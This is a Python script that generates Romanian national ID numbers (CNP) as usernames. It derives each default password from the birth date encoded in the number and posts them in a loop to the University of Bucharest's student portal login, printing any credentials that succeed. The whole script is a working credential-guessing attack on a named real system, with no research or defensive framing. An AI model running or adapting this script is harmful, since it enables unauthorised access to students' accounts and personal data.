import requests

def passwordCreate(username):
    if (username[1]=='0'):
        return username[5:7]+'-'+username[3:5]+'-20'+username[1:3]
    else:
        return username[5:7]+'-'+username[3:5]+'-19'+username[1:3]

def usernameCreate(cnp):
    result=0
    control='279146358279'
    for i in range(len(cnp)):
        result+=int(cnp[i])*int(control[i])
    result%=11
    if result==10:
        return cnp+'1'
    else:
        return cnp+str(result)

with requests.Session() as ses:
    urlPost = 'https://ums.unibuc.ro/ums/do/secure/j_security_check'
    urlGet= 'https://ums.unibuc.ro/ums/do/secure/inregistrare_user'
    urlLogout='https://ums.unibuc.ro/ums/do/secure/logout'
    ses.get(urlGet)
    cookey=ses.cookies["JSESSIONID"]
    firsts=['5']
    dob=['001201']
    locs=['51']
    for i in range(1,1000):
        for date in dob:
            for loc in locs:
                for first in firsts:
                    cnp=first+date+loc+'{:03}'.format(i)
                    username=usernameCreate(cnp)
                    password=passwordCreate(username)
                    auth = {'j_username': username, 'j_password': password, 'JSESSIONID':cookey}
                    ses.post(urlPost, data=auth, headers={"Referer": urlGet})
                    print("tried "+username)
                    if ses.get(urlPost).status_code==400:
                        print('found '+username+"  "+password)
                        ses.get(urlLogout)